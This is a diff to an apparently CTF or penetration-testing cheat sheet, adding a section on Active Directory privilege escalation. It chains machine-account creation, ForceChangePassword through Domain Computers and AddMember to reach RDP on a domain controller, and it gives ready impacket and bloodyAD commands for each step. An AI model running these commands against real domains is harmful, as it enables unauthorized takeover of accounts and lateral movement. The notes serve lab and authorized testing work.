@@ -187,6 +187,27 @@ pwnloop x "bloodyAD --host $T -d <dom> -u <u> -p <p> set password <target> 'New1
 pwnloop x "bloodyAD --host $T -d <dom> -u <u> -p <p> add groupMember '<group>' <u>"
 ```
 
+**`Domain Computers` (or any broad group you can join) as the *source* of an ACE
+is a two-step primitive — read the group's outbound edges, not just users'.**
+Any authenticated user with `MachineAccountQuota>0` can create a computer, which
+is *automatically* a member of `Domain Computers`; whatever that group can do,
+your new computer can do. When BloodHound shows `Domain Computers →
+GenericWrite/ForceChangePassword → <machine accounts>`, the chain is: add a
+computer → as it, reset a pre-created machine account (`ForceChangePassword`) →
+**then chase what *that* seized machine account can do**, which is a separate
+BloodHound query most people skip. A machine account with `AddMember`/`AddSelf`
+over a group is a foothold if that group *nests* into a logon group — e.g. a
+custom `SERVICES` group nested into `Remote Desktop Users` yields interactive RDP
+to a DC (the user-flag path on a DC that has no web surface). Enumerate the group
+membership graph, not only object ACLs:
+```bash
+# add computer -> seize machine acct -> use its AddMember -> land in a logon-capable group
+pwnloop x "impacket-addcomputer <dom>/<u>:<p> -computer-name PWN\$ -computer-pass P4ss -dc-ip $T"
+pwnloop x "bloodyAD --host $T -d <dom> -u 'PWN\$' -p P4ss set password '<MACH>\$' 'New1!'"     # ForceChangePassword via Domain Computers
+pwnloop x "bloodyAD --host $T -d <dom> -u '<MACH>\$' -p 'New1!' add groupMember <group> <youruser>"  # the machine's AddMember
+# then RDP as <youruser> if <group> nests into Remote Desktop Users
+```
+
 **Shadow Credentials** — when you hold `AddKeyCredentialLink` (or GenericWrite/
 All) over a principal, add a key credential and PKINIT as them for their NT hash.
 No password reset, so it is quiet and reversible:
